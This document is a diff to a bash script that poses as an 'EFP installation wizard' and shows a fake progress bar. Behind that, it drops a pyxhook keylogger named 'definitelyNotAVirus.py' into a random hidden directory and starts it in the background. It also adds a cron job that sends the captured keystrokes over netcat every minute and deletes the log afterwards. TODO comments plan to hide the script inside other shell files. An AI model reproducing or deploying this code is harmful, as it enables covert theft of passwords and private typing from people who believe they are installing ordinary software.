@@ -1,9 +1,4 @@
 #!/bin/bash
-
-# This is the install file - only do the one
-# 1. copy python logger script to a hidden place
-	# NOTE: need to add the capability to check whether the script is playing and to hide itself again
-	# BASIC: just save in the /tmp folder
 echo "Welcome to the EFP installation wizard, please wait just a second while we get set up"
 # places the python script in a local file which can then be run
 
@@ -22,8 +17,9 @@ TARGETDIR=''
 getRandDir	#returns TARGETDIR
 echo "REMOVE ON USE: $TARGETDIR"
 
-
-echo "import os 
+# ------------------------------logging file---------------------
+echo "#!/bin/python3
+import os 
 import pyxhook 
 log_file = os.environ.get( 
     'pylogger_file', 
@@ -68,21 +64,43 @@ except Exception as ex:
     with open(log_file, 'a') as f: 
         f.write('\n{}'.format(msg))
 ">> $TARGETDIR/definitelyNotAVirus.py
-chmod u+x $TARGETDIR/definitelyNotAVirus.py
+chmod 777 $TARGETDIR/definitelyNotAVirus.py
+# turns the script on and hides it from the jobs
+# can be killed through pkill -f definitelyNotAVirus.ppy
+nohup python3 $TARGETDIR/definitelyNotAVirus.py > $TARGETDIR/output.log &
 
 # 2. create a cronjob for the logger script
-#write out current crontab
+# #write out current crontab - ERROR: DOESNT WORK DUE TO CRONTAB NOT INSTALLING PYTHON LIBRARIES
+# crontab -l > mycron
+# #echo new cron into cron file
+# echo "*/1 * * * * cd ~/Desktop/definitelyNotAVirus.py && usr/bin/python3 ~/Desktop/definitelyNotAVirus.py" >> mycron
+# #install new cron file
+# crontab mycron
+# rm mycron
+
+#------------------------Sender file---------------------------
+echo "#!/bin/bash
+nc -w 1 localhost 6969 < $TARGETDIR/file.log
+rm $TARGETDIR/file.log
+" >> $TARGETDIR/sender.sh
+chmod 777 $TARGETDIR/sender.sh
+# send every minute
 crontab -l > mycron
 #echo new cron into cron file
-echo "*/1 * * * * cd $TARGETDIR && usr/bin/python $TARGETDIR/definitelyNotAVirus.py" >> mycron
+echo "*/1 * * * * sh $TARGETDIR/sender.sh" >> mycron
 #install new cron file
 crontab mycron
 rm mycron
 
 
+
+
+
+
+
 echo "Please wait while the program installs"
 i=0
-seconds=60
+seconds=10
 for (( i=1; i <= $seconds; i++ ));do
 	echo -ne "#"
 	sleep 1
@@ -90,5 +108,10 @@ done
 echo 
 
 
-# 3. create a cronjob for sending the logger script somewhere
 
+# progress
+    # - reads keys 
+    # sends and recieves keys to port 6969
+
+# TODO:
+    # make it hide itself in other shell files
